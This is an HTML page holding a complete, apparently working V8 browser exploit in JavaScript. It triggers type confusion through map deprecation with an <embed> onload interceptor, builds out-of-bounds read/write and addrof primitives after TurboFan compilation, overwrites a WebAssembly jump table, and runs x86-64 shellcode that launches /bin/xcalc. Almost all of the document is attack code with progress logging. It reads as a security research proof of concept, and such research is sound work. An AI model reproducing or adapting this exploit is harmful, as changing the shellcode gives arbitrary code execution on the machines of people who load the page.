<!-- flags: --no-sandbox -->

<body>
    <script>
        let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
        let f_buf = new Float64Array(fi_buf); // buffer for float
        let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

        // convert float to bigint
        const ftoi = (f) => {
            f_buf[0] = f;
            return i_buf[0];
        }

        // convert bigint to float
        const itof = (i) => {
            i_buf[0] = i;
            return f_buf[0];
        }

        // convert integer to hex string
        const hex = (i) => { return `0x${i.toString(16)}`; }


        let oob_arr;
        let tmp_obj = {};
        let obj_arr;
        let typed_arr;

        (function layout() {
            oob_arr = { 0: 1 }; // allocate elements array
            obj_arr = [tmp_obj];
            typed_arr = new BigUint64Array(1);
        })();


        let embed = document.createElement("embed"); // <embed> has property interceptor
        embed.type = "text/html"; // let embed.onload() is called on append

        let o1 = { __proto__: embed }; // o1: map0
        let o2 = { __proto__: embed }; // o2: map0

        let arr = new Array(1000);
        arr[arr.length - 1] = 1.1;
        arr.prop = 1; // store field type for load elimination

        embed.onload = () => {
            o1.regular = 1; // o1: map1
            o1.corrupted = arr; // o1: map2
        }
        document.body.append(embed);
        o1.corrupted = 2; // o1: map3

        embed.onload = () => {
            o2.regular = 1; // o1: map1
            o2.corrupted = arr; // o2: map2
            o1.regular = 1.1; // o1: map4 (map1 and map2 are deprecated)
        }
        document.body.append(embed);
        o2.corrupted = oob_arr; // o2: map4 (migrate from map2)

        function read(obj, idx) { return obj.corrupted[idx]; }
        for (let i = 0; i < 0x10000; i++) { read(o1, arr.length - 1); } // compile via turbofan

        function write(obj, idx, value) { obj.corrupted[idx] = value; }
        for (let i = 0; i < 0x10000; i++) { write(o1, arr.length - 1, 1.1); } // compile via turbofan


        // get v8 base address
        let v8_base = ftoi(read(o2, 26)) >> 32n << 32n;
        console.log(`[+] v8_base == ${hex(v8_base)}`);

        // get (compressed) address of obj
        function addrof(obj) {
            obj_arr[0] = obj;
            return ftoi(read(o2, 9)) >> 32n;
        }

        // read 8-byte from addr
        function read8(addr) {
            write(o2, 26, itof(addr)); // external_pointer of typed_arr
            write(o2, 27, itof(0n)); // base_pointer of typed_arr
            return typed_arr[0];
        }

        // write 8-byte value to addr
        function write8(addr, value) {
            write(o2, 26, itof(addr)); // external_pointer of typed_arr
            write(o2, 27, itof(0n)); // base_pointer of typed_arr
            typed_arr[0] = value;
        }


        // generate wasm module
        let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]); // output of wasm.py
        let wasm_module = new WebAssembly.Module(wasm_src);

        // get address of jump table
        let wasm_instance = new WebAssembly.Instance(wasm_module);
        let wasm_instance_addr = v8_base + addrof(wasm_instance);
        let jump_table_start = read8(wasm_instance_addr - 1n + 0x68n);
        console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

        // execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
        let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]; // output of shellcode.py

        // overwrite backing store of arraybuffer with address of jump table
        let buf = new ArrayBuffer(shellcode.length);
        let buf_addr = v8_base + addrof(buf);
        write8(buf_addr - 1n + 0x14n, jump_table_start);

        // overwrite jump table with shellcode
        console.log("[+] Writing shellcode...");
        let view = new DataView(buf);
        for (let i = 0; i < shellcode.length; i++) { view.setUint8(i, shellcode[i]); }

        // execute shellcode
        console.log("[+] Executing shellcode...");
        wasm_instance.exports.main();
    </script>
</body>
